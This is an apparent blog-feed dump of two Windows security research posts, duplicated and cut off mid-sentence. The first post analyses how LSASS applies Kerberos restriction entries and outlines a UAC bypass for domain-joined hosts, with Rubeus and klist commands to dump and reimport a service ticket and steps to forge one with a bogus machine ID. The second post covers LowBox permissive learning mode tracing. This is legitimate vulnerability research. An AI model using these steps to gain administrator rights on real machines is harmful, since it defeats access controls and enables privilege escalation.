style=\"background-color: #f9cb9c; font-family: courier;\">&nbsp; &nbsp; bLoopback = TRUE;</span></div><div><span style=\"background-color: #f9cb9c; font-family: courier;\">&nbsp; }</span></div><div><span style=\"font-family: courier;\"><br /></span></div><div><span style=\"background-color: #93c47d; font-family: courier;\">&nbsp; if (LsapGlobalFilterNetworkAuthenticationTokens) {</span></div><div><span style=\"background-color: #93c47d; font-family: courier;\">&nbsp; &nbsp; if (pTokenInfo-&gt;Flags &amp; LimitedToken) {</span></div><div><span style=\"background-color: #93c47d; font-family: courier;\">&nbsp; &nbsp; &nbsp; bFilterToken = TRUE;</span></div><div><span style=\"background-color: #93c47d; font-family: courier;\">&nbsp; &nbsp; }</span></div><div><span style=\"background-color: #93c47d; font-family: courier;\">&nbsp; }</span></div><div><span style=\"font-family: courier;\"><br /></span></div><div><span style=\"background-color: #e06666; font-family: courier;\">&nbsp; PSID user = GetUserSid(*phToken);</span></div><div><span style=\"background-color: #e06666; font-family: courier;\">&nbsp; if (!RtlEqualPrefixSid(LsapAccountDomainMemberSid, user)</span></div><div><span style=\"background-color: #e06666; font-family: courier;\">&nbsp; &nbsp; || LsapGlobalLocalAccountTokenFilterPolicy&nbsp;</span></div><div><span style=\"background-color: #e06666; font-family: courier;\">&nbsp; &nbsp; || NegProductType == NtProductLanManNt) {</span></div><div><span style=\"background-color: #e06666; font-family: courier;\">&nbsp; &nbsp; if ( !bFilterToken &amp;&amp; !bLoopback )</span></div><div><span style=\"background-color: #e06666; font-family: courier;\">&nbsp; &nbsp; &nbsp; return STATUS_SUCCESS;</span></div><div><span style=\"background-color: #e06666; font-family: courier;\">&nbsp; }</span></div><div><span style=\"font-family: courier;\"><br /></span></div><div><span style=\"font-family: courier;\">&nbsp; /// Filter token if needed and drop integrity level.</span></div><div><span style=\"font-family: courier;\">}</span></div></div><div><br /></div><div>I've highlighted the three main checks in this function, the first compares if the <i>MachineID </i>field of the&nbsp;<i>KERB-AD-RESTRICTION-ENTRY</i> matches the one stored in LSASS. If it is then the <i>bLoopback</i> flag is set. Then it checks an AFAIK undocumented LSA flag to filter all network tokens, at which point it'll check for the&nbsp;<i>LimitedToken</i> flag and set the&nbsp;<i>bFilterToken</i> flag accordingly. This filtering mode defaults to off so in general <i>bFilterToken</i> won't be set.</div><div><br /></div><div>Finally the code queries for the current created token SID and checks if any of the following is true:</div><div><ul style=\"text-align: left;\"><li>The user SID is not a member of the local account domain.</li><li>The&nbsp;<a href=\"https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction\">LocalAccountTokenFilterPolicy</a> LSA policy is non-zero, which disables the local account filtering.</li><li>The product type is&nbsp;<i>NtProductLanManNt</i>, which actually corresponds to a domain controller.</li></ul><div>If any are true then as long as the token information is neither loopback or filtering is forced the function will return success and no filtering will take place. Therefore in a default installation for a domain user to not be filtered comes down whether the machine ID matches or not.&nbsp;</div></div><div><br /></div><div>For the integrity level, if filtering is taking place then it will be dropped to the value in the&nbsp;<i>KERB-AD-RESTRICTION-ENTRY</i> authentication data. However it won't increase the integrity level above what the created token has by default, so this can't be abused to get System integrity.</div><div><br /></div><div>Note <i>Kerberos </i>will call&nbsp;<i>LsaISetSupplementalTokenInfo </i>with the&nbsp;<i>KERB-AD-RESTRICTION-ENTRY</i>&nbsp;authentication data from the ticket in the AP-REQ first. If that doesn't exist then it'll try calling it with the entry from the authenticator. If neither the ticket or authenticator has an entry then it will never be called. How can we remove these values?</div><div><br /></div><h3 style=\"text-align: left;\">Well, about that!</h3><div>Okay how can we abuse this to bypass UAC? Assuming you're authenticated as a domain user the funniest way to abuse it is get the machine ID check to fail. How would we do that? The&nbsp;<i>LsapGlobalMachineID</i> value is a random value generated when LSASS starts up. We can abuse the fact that if you query the user's local Kerberos ticket cache it will return the session key for service tickets even if you're not an administrator (it won't return TGT session keys by default).</div><div><br /></div><div>Therefore one approach is to generate a service ticket for the local system, save the resulting <i>KRB-CRED</i> to disk, reboot the system to get LSASS to reinitialize and then when back on the system reload the ticket. This ticket will now have a different machine ID and therefore <i>Kerberos </i>will ignore the restrictions entry. You could do it with the builtin <i>klist</i> and <i>Rubeus</i> with the following commands:</div><div><br /></div><div><span style=\"font-family: courier;\">PS&gt; klist get RPC/$env:COMPUTERNAME</span></div><div><span style=\"font-family: courier;\">PS&gt; Rubeus.exe&nbsp;/dump /server:$env:COMPUTERNAME /nowrap</span></div><div><span style=\"font-family: courier;\">... Copy the base64 ticket to a file.</span></div><div><br /></div><div>Reboot then:</div><div><br /></div><div><span style=\"font-family: courier;\">PS&gt; Rubeus.exe ptt /ticket:&lt;BASE64 TICKET&gt;&nbsp;</span></div><div><br /></div><div>You can use <i>Kerberos </i>authentication to access the SCM over named pipes or TCP using the <i>RPC/HOSTNAME</i> SPN.&nbsp; Note the Win32 APIs for the SCM always use <i>Negotiate</i> authentication which throws a spanner in the works, but there are alternative RPC clients ;-) While LSASS will add a valid restrictions entry to the authenticator in the AP-REQ it won't be used as the one in the ticket will be used first which will fail to apply due to the different machine ID.</div><div><br /></div><div>The other approach is to generate our own ticket, but won't we need credentials for that? There's a trick, I believe discovered by&nbsp;<a href=\"https://twitter.com/gentilkiwi\">Benjamin Delpy</a> and put into <i>kekeo </i>that allows you to abuse unconstrained delegation to get a local TGT with a session key. With this TGT you can generate your own service tickets, so you can do the following:</div><div><ol style=\"text-align: left;\"><li>Query for the user's TGT using the delegation trick.</li><li>Make a request to the KDC for a new service ticket for the local machine using the TGT. Add a&nbsp;<i>KERB-AD-RESTRICTION-ENTRY</i> but fill in a bogus machine ID.</li><li>Import the service ticket into the cache.</li><li>Access the SCM to bypass UAC.</li></ol></div><div>Ultimately this is a reasonable amount lot of code for a UAC bypass, at least compared to the just <a href=\"https://www.tiraniddo.dev/2017/05/exploiting-environment-variables-in.html\">changing an environment variable</a>. However, you can probably bodge it together using existing tools such as <i>kekeo </i>and <i>Rubeus</i>, but I'm not going to release a turn key tool to do this, you're on your own :-)</div><div><br /></div><h3 style=\"text-align: left;\">Didn't you forget KERB-LOCAL?</h3><div>What is the purpose of <i>KERB-LOCAL</i>? It's a way of reusing the local user's credentials, this is similar to NTLM loopback where LSASS is able to determine that the call is actually from a locally authenticated user and use their interactive token. The value passed in the ticket and authenticator can be checked against a list of known credentials in the Kerberos package and if there's a match the existing token will be used.</div><div><br /></div><div>Would this not always eliminate the need for the&nbsp;filtering the token based on the&nbsp;<i>KERB-AD-RESTRICTION-ENTRY</i> value? It seems that this behavior is used very infrequently due to how it's designed. First it only works if the accepting server is using the <i>Negotiate </i>package, it doesn't work if using the <i>Kerberos </i>package directly (sort of...). That's usually not an impediment as most local services use <i>Negotiate </i>anyway for convenience.&nbsp;</div><div><br /></div><div>The real problem is that as a rule if you use <i>Negotiate </i>to the local machine as a client it'll select NTLM as the default. This will use the loopback already built into NTLM rather than Kerberos so this feature won't be used. Note that even if NTLM is disabled globally on the domain network it will still work for local loopback authentication. I guess <i>KERB-LOCAL</i> was added for feature parity with NTLM.</div><div><br /></div><div>Going back to the formatted ticket at the start of the blog what does the <i>KERB-LOCAL</i> value mean? It can be unpacked into two 64bit values, 0x17E3303CE60 and 0x3976FC25. The first value is the heap address of the <i>KERB_CREDENTIAL</i> structure in LSASS's heap!! The second value is the ticket count when the KERB-LOCAL structure was created.</div><div><br /></div><div>Fortunately LSSAS doesn't just dereference the credentials pointer, it must be in the list of valid credential structures. But the fact that this value isn't blinded or references a randomly generated value seems a mistake as heap addresses would be fairly easy to brute force. Of course it's not quite so simple, <i>Kerberos </i>does verify that the SID in the ticket's PAC matches the SID in the credentials so you can't just spoof the SYSTEM session, but well, I'll leave that as a thought to be going on with.</div><div><br /></div><div>Hopefully this gives some more insight into how this feature works and some fun you can have trying to bypass UAC in a new way.</div><div><br /></div><div>UPDATE: <a href=\"https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82\">This simple C++ file</a> can be used to modify the Win32 SCM APIs to use Kerberos for local authentication.</div>"}], "summary": "<p>While it's not something I spend much time on, finding a new way to bypass UAC is always amusing. When reading through some of the features of the <a href=\"https://github.com/GhostPack/Rubeus\">Rubeus</a> tool I realised that there was a possible way of abusing Kerberos to bypass UAC, well on domain joined systems at least. It's unclear if this has been documented before, <a href=\"https://ijustwannared.team/2020/02/13/impacket-proxychains-rubeus-and-uac/\">this post</a> seems to discuss something similar but relies on doing the UAC bypass from another system, but what I'm going to describe works locally. Even if it has been described as a technique before I'm not sure it's been documented how it works under the hood.</p><h3 style=\"text-align: left;\">The Background!</h3><div>Let's start with how the system prevents you bypassing the most pointless security feature ever. By default LSASS will filter any network authentication tokens to remove admin privileges if the users is a local administrator. However there's an important exception, if the user a domain user and a local administrator then LSASS will allow the network authentication to use the full administrator token. This is a problem if say you're using <i>Kerberos </i>to authenticate locally. Wouldn't this be a trivial UAC bypass? Just authenticate to the local service as a domain user and you'd get the network token which would bypass the filtering?</div><div><br /></div><div>Well no, <i>Kerberos </i>has specific additions to block this attack vector. If I was being charitable I'd say this behaviour also ensures some level of safety.&nbsp; If you're not running as the admin token then accessing say the SMB loopback interface shouldn't suddenly grant you administrator privileges through which you might accidentally destroy your system.</div><div><br /></div><div>Back in January last year I read a&nbsp;<a href=\"https://syfuhs.net/preventing-uac-bypass-through-kerberos-loopback\">post</a>&nbsp;from&nbsp;<a href=\"https://twitter.com/SteveSyfuhs\">Steve Syfuhs</a>&nbsp;of Microsoft on how <i>Kerberos </i>prevents this local UAC bypass. The TL;DR; is when a user wants to get a <i>Kerberos </i>ticket for a service LSASS will send a TGS-REQ request to the KDC. In the request it'll embed some security information which indicates the user is local. This information will be embedded in the generated ticket.&nbsp;</div><div><br /></div><div>When that ticket is used to authenticate to the same system <i>Kerberos </i>can extract the information and see if it matches one it knows about. If so it'll take that information and realize that the user is not elevated and filter the token appropriately. Unfortunately much as enjoy Steve's posts this one was especially light on details. I guessed I'd have to track down how it works myself. Let's dump the contents of a <i>Kerberos </i>ticket and see if we can see what could be the ticket information:</div><div><br /></div><div><div><span style=\"font-family: courier;\"><b>PS&gt;</b> $c = New-LsaCredentialHandle -Package 'Kerberos' -UseFlag Outbound</span></div><div><span style=\"font-family: courier;\"><b>PS&gt;</b> $x = New-LsaClientContext -CredHandle $c -Target HOST/$env:COMPUTERNAME</span></div><div><span style=\"font-family: courier;\"><b>PS&gt;</b> $key = Get-KerberosKey -HexKey 'XXX' -KeyType AES256_CTS_HMAC_SHA1_96 -Principal $env:COMPTUERNAME</span></div><div><span style=\"font-family: courier;\"><b>PS&gt;</b> $u = Unprotect-LsaAuthToken -Token $x.Token -Key $key</span></div><div><span style=\"font-family: courier;\"><b>PS&gt;</b> Format-LsaAuthToken $u</span></div></div><div><span style=\"font-family: courier;\"><br /></span></div><div><div><span style=\"font-family: courier;\">&lt;KerberosV5 KRB_AP_REQ&gt;</span></div><div><span style=\"font-family: courier;\">Options&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: None</span></div><div><span style=\"font-family: courier;\">&lt;Ticket&gt;</span></div><div><span style=\"font-family: courier;\">Ticket Version&nbsp; : 5</span></div></div><div><span style=\"font-family: courier;\">...</span></div><div><br /></div><div><div><span style=\"background-color: #e06666; font-family: courier;\">&lt;Authorization Data - KERB_AD_RESTRICTION_ENTRY&gt;</span></div><div><span style=\"background-color: #e06666; font-family: courier;\">Flags&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: LimitedToken</span></div><div><span style=\"background-color: #e06666; font-family: courier;\">Integrity Level : Medium</span></div><div><span style=\"background-color: #e06666; font-family: courier;\">Machine ID&nbsp; &nbsp; &nbsp; : 6640665F...</span></div><div><span style=\"font-family: courier;\"><br /></span></div><div><span style=\"background-color: #ffd966; font-family: courier;\">&lt;Authorization Data - KERB_LOCAL&gt;</span></div><div><span style=\"background-color: #ffd966; font-family: courier;\">Security Context: 60CE03337E01000025FC763900000000</span></div></div><div><br /></div><div>I've highlighted the two ones of interest, the <a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/1aeca7fb-d6b4-4402-8fa4-6ec3e955c16e\">KERB-AD-RESTRICTION-ENTRY</a> and the <a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/2a01b297-c47f-4547-9268-cf589aedd063\">KERB-LOCAL</a> entry. Of course I didn't guess these names, these are sort of documented in the Microsoft Kerberos Protocol Extensions (<a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/2a32282e-dd48-4ad9-a542-609804b02cc9\">MS-KILE</a>) specification. The&nbsp;<i>KERB_AD_RESTRICTION_ENTRY</i> is most obviously of interest, it contains both the works <i>\"LimitedToken\"</i> and <i>\"Medium Integrity Level\"</i>.&nbsp;</div><div><br /></div><div>When accepting a Kerberos <i>AP-REQ</i> from a network client via SSPI the Kerberos module in LSASS will call the LSA function&nbsp;<i>LsaISetSupplementalTokenInfo</i> to apply the information from&nbsp;<i>KERB-AD-RESTRICTION-ENTRY</i> to the token if needed. The pertinent code is roughly the following:</div><div><br /></div><div><div><span style=\"font-family: courier;\">NTSTATUS LsaISetSupplementalTokenInfo(PHANDLE phToken,&nbsp;</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; PLSAP_TOKEN_INFO_INTEGRITY pTokenInfo) {</span></div><div><span style=\"font-family: courier;\">&nbsp; // ...</span></div><div><span style=\"font-family: courier;\">&nbsp; BOOL bLoopback = FALSE:</span></div><div><span style=\"font-family: courier;\">&nbsp; BOOL bFilterNetworkTokens = FALSE;</span></div><div><span style=\"font-family: courier;\"><br /></span></div><div><span style=\"background-color: #f9cb9c; font-family: courier;\">&nbsp; if (!memcmp(&amp;LsapGlobalMachineID, pTokenInfo-&gt;MachineID,</span></div><div><span style=\"background-color: #f9cb9c; font-family: courier;\">&nbsp; &nbsp; &nbsp; &nbsp;sizeof(LsapGlobalMachineID))) {</span></div><div><span style=\"background-color: #f9cb9c; font-family: courier;\">&nbsp; &nbsp; bLoopback = TRUE;</span></div><div><span style=\"background-color: #f9cb9c; font-family: courier;\">&nbsp; }</span></div><div><span style=\"font-family: courier;\"><br /></span></div><div><span style=\"background-color: #93c47d; font-family: courier;\">&nbsp; if (LsapGlobalFilterNetworkAuthenticationTokens) {</span></div><div><span style=\"background-color: #93c47d; font-family: courier;\">&nbsp; &nbsp; if (pTokenInfo-&gt;Flags &amp; LimitedToken) {</span></div><div><span style=\"background-color: #93c47d; font-family: courier;\">&nbsp; &nbsp; &nbsp; bFilterToken = TRUE;</span></div><div><span style=\"background-color: #93c47d; font-family: courier;\">&nbsp; &nbsp; }</span></div><div><span style=\"background-color: #93c47d; font-family: courier;\">&nbsp; }</span></div><div><span style=\"font-family: courier;\"><br /></span></div><div><span style=\"background-color: #e06666; font-family: courier;\">&nbsp; PSID user = GetUserSid(*phToken);</span></div><div><span style=\"background-color: #e06666; font-family: courier;\">&nbsp; if (!RtlEqualPrefixSid(LsapAccountDomainMemberSid, user)</span></div><div><span style=\"background-color: #e06666; font-family: courier;\">&nbsp; &nbsp; || LsapGlobalLocalAccountTokenFilterPolicy&nbsp;</span></div><div><span style=\"background-color: #e06666; font-family: courier;\">&nbsp; &nbsp; || NegProductType == NtProductLanManNt) {</span></div><div><span style=\"background-color: #e06666; font-family: courier;\">&nbsp; &nbsp; if ( !bFilterToken &amp;&amp; !bLoopback )</span></div><div><span style=\"background-color: #e06666; font-family: courier;\">&nbsp; &nbsp; &nbsp; return STATUS_SUCCESS;</span></div><div><span style=\"background-color: #e06666; font-family: courier;\">&nbsp; }</span></div><div><span style=\"font-family: courier;\"><br /></span></div><div><span style=\"font-family: courier;\">&nbsp; /// Filter token if needed and drop integrity level.</span></div><div><span style=\"font-family: courier;\">}</span></div></div><div><br /></div><div>I've highlighted the three main checks in this function, the first compares if the <i>MachineID </i>field of the&nbsp;<i>KERB-AD-RESTRICTION-ENTRY</i> matches the one stored in LSASS. If it is then the <i>bLoopback</i> flag is set. Then it checks an AFAIK undocumented LSA flag to filter all network tokens, at which point it'll check for the&nbsp;<i>LimitedToken</i> flag and set the&nbsp;<i>bFilterToken</i> flag accordingly. This filtering mode defaults to off so in general <i>bFilterToken</i> won't be set.</div><div><br /></div><div>Finally the code queries for the current created token SID and checks if any of the following is true:</div><div><ul style=\"text-align: left;\"><li>The user SID is not a member of the local account domain.</li><li>The&nbsp;<a href=\"https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction\">LocalAccountTokenFilterPolicy</a> LSA policy is non-zero, which disables the local account filtering.</li><li>The product type is&nbsp;<i>NtProductLanManNt</i>, which actually corresponds to a domain controller.</li></ul><div>If any are true then as long as the token information is neither loopback or filtering is forced the function will return success and no filtering will take place. Therefore in a default installation for a domain user to not be filtered comes down whether the machine ID matches or not.&nbsp;</div></div><div><br /></div><div>For the integrity level, if filtering is taking place then it will be dropped to the value in the&nbsp;<i>KERB-AD-RESTRICTION-ENTRY</i> authentication data. However it won't increase the integrity level above what the created token has by default, so this can't be abused to get System integrity.</div><div><br /></div><div>Note <i>Kerberos </i>will call&nbsp;<i>LsaISetSupplementalTokenInfo </i>with the&nbsp;<i>KERB-AD-RESTRICTION-ENTRY</i>&nbsp;authentication data from the ticket in the AP-REQ first. If that doesn't exist then it'll try calling it with the entry from the authenticator. If neither the ticket or authenticator has an entry then it will never be called. How can we remove these values?</div><div><br /></div><h3 style=\"text-align: left;\">Well, about that!</h3><div>Okay how can we abuse this to bypass UAC? Assuming you're authenticated as a domain user the funniest way to abuse it is get the machine ID check to fail. How would we do that? The&nbsp;<i>LsapGlobalMachineID</i> value is a random value generated when LSASS starts up. We can abuse the fact that if you query the user's local Kerberos ticket cache it will return the session key for service tickets even if you're not an administrator (it won't return TGT session keys by default).</div><div><br /></div><div>Therefore one approach is to generate a service ticket for the local system, save the resulting <i>KRB-CRED</i> to disk, reboot the system to get LSASS to reinitialize and then when back on the system reload the ticket. This ticket will now have a different machine ID and therefore <i>Kerberos </i>will ignore the restrictions entry. You could do it with the builtin <i>klist</i> and <i>Rubeus</i> with the following commands:</div><div><br /></div><div><span style=\"font-family: courier;\">PS&gt; klist get RPC/$env:COMPUTERNAME</span></div><div><span style=\"font-family: courier;\">PS&gt; Rubeus.exe&nbsp;/dump /server:$env:COMPUTERNAME /nowrap</span></div><div><span style=\"font-family: courier;\">... Copy the base64 ticket to a file.</span></div><div><br /></div><div>Reboot then:</div><div><br /></div><div><span style=\"font-family: courier;\">PS&gt; Rubeus.exe ptt /ticket:&lt;BASE64 TICKET&gt;&nbsp;</span></div><div><br /></div><div>You can use <i>Kerberos </i>authentication to access the SCM over named pipes or TCP using the <i>RPC/HOSTNAME</i> SPN.&nbsp; Note the Win32 APIs for the SCM always use <i>Negotiate</i> authentication which throws a spanner in the works, but there are alternative RPC clients ;-) While LSASS will add a valid restrictions entry to the authenticator in the AP-REQ it won't be used as the one in the ticket will be used first which will fail to apply due to the different machine ID.</div><div><br /></div><div>The other approach is to generate our own ticket, but won't we need credentials for that? There's a trick, I believe discovered by&nbsp;<a href=\"https://twitter.com/gentilkiwi\">Benjamin Delpy</a> and put into <i>kekeo </i>that allows you to abuse unconstrained delegation to get a local TGT with a session key. With this TGT you can generate your own service tickets, so you can do the following:</div><div><ol style=\"text-align: left;\"><li>Query for the user's TGT using the delegation trick.</li><li>Make a request to the KDC for a new service ticket for the local machine using the TGT. Add a&nbsp;<i>KERB-AD-RESTRICTION-ENTRY</i> but fill in a bogus machine ID.</li><li>Import the service ticket into the cache.</li><li>Access the SCM to bypass UAC.</li></ol></div><div>Ultimately this is a reasonable amount lot of code for a UAC bypass, at least compared to the just <a href=\"https://www.tiraniddo.dev/2017/05/exploiting-environment-variables-in.html\">changing an environment variable</a>. However, you can probably bodge it together using existing tools such as <i>kekeo </i>and <i>Rubeus</i>, but I'm not going to release a turn key tool to do this, you're on your own :-)</div><div><br /></div><h3 style=\"text-align: left;\">Didn't you forget KERB-LOCAL?</h3><div>What is the purpose of <i>KERB-LOCAL</i>? It's a way of reusing the local user's credentials, this is similar to NTLM loopback where LSASS is able to determine that the call is actually from a locally authenticated user and use their interactive token. The value passed in the ticket and authenticator can be checked against a list of known credentials in the Kerberos package and if there's a match the existing token will be used.</div><div><br /></div><div>Would this not always eliminate the need for the&nbsp;filtering the token based on the&nbsp;<i>KERB-AD-RESTRICTION-ENTRY</i> value? It seems that this behavior is used very infrequently due to how it's designed. First it only works if the accepting server is using the <i>Negotiate </i>package, it doesn't work if using the <i>Kerberos </i>package directly (sort of...). That's usually not an impediment as most local services use <i>Negotiate </i>anyway for convenience.&nbsp;</div><div><br /></div><div>The real problem is that as a rule if you use <i>Negotiate </i>to the local machine as a client it'll select NTLM as the default. This will use the loopback already built into NTLM rather than Kerberos so this feature won't be used. Note that even if NTLM is disabled globally on the domain network it will still work for local loopback authentication. I guess <i>KERB-LOCAL</i> was added for feature parity with NTLM.</div><div><br /></div><div>Going back to the formatted ticket at the start of the blog what does the <i>KERB-LOCAL</i> value mean? It can be unpacked into two 64bit values, 0x17E3303CE60 and 0x3976FC25. The first value is the heap address of the <i>KERB_CREDENTIAL</i> structure in LSASS's heap!! The second value is the ticket count when the KERB-LOCAL structure was created.</div><div><br /></div><div>Fortunately LSSAS doesn't just dereference the credentials pointer, it must be in the list of valid credential structures. But the fact that this value isn't blinded or references a randomly generated value seems a mistake as heap addresses would be fairly easy to brute force. Of course it's not quite so simple, <i>Kerberos </i>does verify that the SID in the ticket's PAC matches the SID in the credentials so you can't just spoof the SYSTEM session, but well, I'll leave that as a thought to be going on with.</div><div><br /></div><div>Hopefully this gives some more insight into how this feature works and some fun you can have trying to bypass UAC in a new way.</div><div><br /></div><div>UPDATE: <a href=\"https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82\">This simple C++ file</a> can be used to modify the Win32 SCM APIs to use Kerberos for local authentication.</div>", "links": [{"rel": "edit", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/3024444652464781277"}, {"rel": "self", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/3024444652464781277"}, {"rel": "alternate", "type": "text/html", "href": "https://www.tiraniddo.dev/2022/03/bypassing-uac-in-most-complex-way.html", "title": "Bypassing UAC in the most Complex Way Possible!"}], "authors": [{"name": "Unknown", "email": "noreply@blogger.com"}], "author_detail": {"name": "Unknown", "email": "noreply@blogger.com"}, "author": "Unknown (noreply@blogger.com)", "gd_image": {"rel": "http://schemas.google.com/g/2005#thumbnail", "width": "16", "height": "16", "src": "https://img1.blogblog.com/img/b16-rounded.gif"}}, {"id": "tag:blogger.com,1999:blog-4304739697716191998.post-1176374155533801347", "guidislink": true, "link": "https://www.tiraniddo.dev/2021/09/lowbox-token-permissive-learning-mode.html", "published": "2021-09-06T23:53:00.000-07:00", "published_parsed": [2021, 9, 7, 6, 53, 0, 1, 250, 0], "updated": "2021-09-06T23:53:02.594-07:00", "updated_parsed": [2021, 9, 7, 6, 53, 2, 1, 250, 0], "title": "LowBox Token Permissive Learning Mode", "title_detail": {"type": "text/plain", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "LowBox Token Permissive Learning Mode"}, "content": [{"type": "text/html", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "<p>I was recently asked about this topic and so I thought it'd make sense to put it into a public blog post so that everyone can benefit. Windows 11 (and Windows Server 2022) has a new feature for tokens which allow the kernel to perform the normal LowBox access check, but if it fails log the error rather than failing with access denied.&nbsp;</p><p>This feature allows you to start an AppContainer sandbox process, run a task, and determine what parts of that would fail if you actually tried to sandbox a process. This makes it much easier to determine what capabilities you might need to grant to prevent your application from crashing if you tried to actually apply the sandbox. It's a very useful diagnostic tool, although whether it'll be documented by Microsoft remains to be seen. Let's go through a quick example of how to use it.</p><p>First you need to start an ETW trace for the&nbsp;<i>Microsoft-Windows-Kernel-General</i> provider with the&nbsp;<i>KERNEL_GENERAL_SECURITY_ACCESSCHECK</i> keyword (value 0x20) enabled. In an administrator PowerShell console you can run the following:</p><div style=\"text-align: left;\"><span style=\"font-family: courier;\">PS&gt; $name = 'AccessTrace'<br />PS&gt; New-NetEventSession -Name $name -LocalFilePath \"$env:USERPROFILE\\access_trace.etl\" | Out-Null<br />PS&gt; Add-NetEventProvider -SessionName $name -Name \"Microsoft-Windows-Kernel-General\" -MatchAllKeyword 0x20 | Out-Null<br />PS&gt; Start-NetEventSession -Name $name</span></div><p>This will start the trace session and log the events to&nbsp;<i>access_trace.etl</i> file if your home directory. As this is ETW you could probably do a real-time trace or enable stack tracing to find out what code is actually failing, however for this example we'll do the least amount of work possible. This log is also used for things like Adminless which I've <a href=\"https://www.tiraniddo.dev/2019/01/enabling-adminless-mode-on-windows-10.html\">blogged</a> about before.</p><p>Now you need to generate some log events. You just need to add the <i><b>permissiveLearningMode</b></i> capability when creating the lowbox token or process. You can almost certainly add it to your application's manifest as well when developing a sandboxed UWP application, but we'll assume here that we're setting up the sandbox manually.</p><div style=\"text-align: left;\"><span style=\"font-family: courier;\">PS&gt; $cap = Get-NtSid -CapabilityName 'permissiveLearningMode'<br />PS&gt; $token = Get-NtToken -LowBox -PackageSid ABC -CapabilitySid $cap<br />PS&gt;&nbsp;Invoke-NtToken $token { \"Hello\" | Set-Content \"$env:USERPOFILE\\test.txt\" }</span></div><p>The previous code creates a lowbox token with the capability and writes to a file in the user's profile. This would normally fail as the user's profile doesn't grant any AppContainer access to write to it. However, you should find the write succeeded. Now, back in the admin PowerShell console you'll want to stop the trace and cleanup the session.</p><div style=\"text-align: left;\"><span style=\"font-family: courier;\">PS&gt; Stop-NetEventSession -Name $name<br />PS&gt; Remove-NetEventSession -Name $name</span></div><p>You should find an <i>access_trace.etl</i> file in your user's profile directory which will contain the logged events. There are various ways to read this file, the simplest is to use the <i>Get-WinEvent</i> command. As you need to do a bit of parsing of the contents of the log to get out various values I've put together a simple script do that. It's available on github <a href=\"https://gist.github.com/tyranid/a219ed36c7bca7a23036d9f6cedf0cdf\">here</a>. Just run the script passing the name of the log file to convert the events into PowerShell objects.</p><div style=\"text-align: left;\"><span style=\"font-family: courier;\">PS&gt; parse_access_check_log.ps1 \"$env:USERPROFILE\\access_trace.etl\"</span></div><div style=\"text-align: left;\"><span style=\"font-family: courier;\">ProcessName&nbsp; &nbsp; &nbsp; &nbsp; : ...\\v1.0\\powershell.exe<br />Mask&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: MaximumAllowed<br />PackageSid&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: S-1-15-2-1445519891-4232675966-...<br />Groups&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: INSIDERDEV\\user<br />Capabilities&nbsp; &nbsp; &nbsp; &nbsp;: NAMED CAPABILITIES\\Permissive Learning Mode<br />SecurityDescriptor : O:BAG:BAD:(A;OICI;KA;;;S-1-5-21-623841239-...</span></div><div style=\"text-align: left;\"><span style=\"font-family: inherit;\"><br /></span></div><div style=\"text-align: left;\"><span style=\"font-family: inherit;\">The log events don't seem to contain the name of the resource being opened, but it does contain the security descriptor and type of the object, what access mask was requested and basic information about the access token used.&nbsp;</span><span style=\"font-family: inherit;\">Hopefully this information is useful to someone.</span></div>"}], "summary": "<p>I was recently asked about this topic and so I thought it'd make sense to put it into a public blog post so that everyone can benefit. Windows 11 (and Windows Server 2022) has a new feature for tokens which allow the kernel to perform the normal LowBox access check, but if it fails log the error rather than failing with access denied.&nbsp;</p><p>This feature allows you to start an AppContainer sandbox process, run a task, and determine what parts of that would fail if you actually tried to sandbox a process. This makes it much easier to determine what capabilities you might need to grant to prevent your application from crashing if you tried to actually apply the sandbox. It's a very useful diagnostic tool, although whether it'll be documented by Microsoft remains to be seen. Let's go through a quick example of how to use it.</p><p>First you need to start an ETW trace for the&nbsp;<i>Microsoft-Windows-Kernel-General</i> provider with the&nbsp;<i>KERNEL_GENERAL_SECURITY_ACCESSCHECK</i> keyword (value 0x20) enabled. In an administrator PowerShell console you can run the following:</p><div style=\"text-align: left;\"><span style=\"font-family: courier;\">PS&gt; $name = 'AccessTrace'<br />PS&gt; New-NetEventSession -Name $name -LocalFilePath \"$env:USERPROFILE\\access_trace.etl\" | Out-Null<br />PS&gt; Add-NetEventProvider -SessionName $name -Name \"Microsoft-Windows-Kernel-General\" -MatchAllKeyword 0x20 | Out-Null<br />PS&gt; Start-NetEventSession -Name $name</span></div><p>This will start the trace session and log the events to&nbsp;<i>access_trace.etl</i> file if your home directory. As this is ETW you could probably do a real-time trace or enable stack tracing to find out what code is actually failing, however for this example we'll do the least amount of work possible. This log is also used for things like Adminless which I've <a href=\"https://www.tiraniddo.dev/2019/01/enabling-adminless-mode-on-windows-10.html\">blogged</a> about before.</p><p>Now you need to generate some log events. You just need to add the <i><b>permissiveLearningMode</b></i> capability when creating the lowbox token or process. You can almost certainly add it to your application's manifest as well when developing a sandboxed UWP application, but we'll assume here that we're setting up the sandbox manually.</p><div style=\"text-align: left;\"><span style=\"font-family: courier;\">PS&gt; $cap = Get-NtSid -CapabilityName 'permissiveLearningMode'<br />PS&gt; $token = Get-NtToken -LowBox -PackageSid ABC -CapabilitySid $cap<br />PS&gt;&nbsp;Invoke-NtToken $token { \"Hello\" | Set-Content \"$env:USERPOFILE\\test.txt\" }</span></div><p>The previous code creates a lowbox token with the capability and writes to a file in the user's profile. This would normally fail as the user's profile doesn't grant any AppContainer access to write to it. However, you should find the write succeeded. Now, back in the admin PowerShell console you'll want to stop the trace and 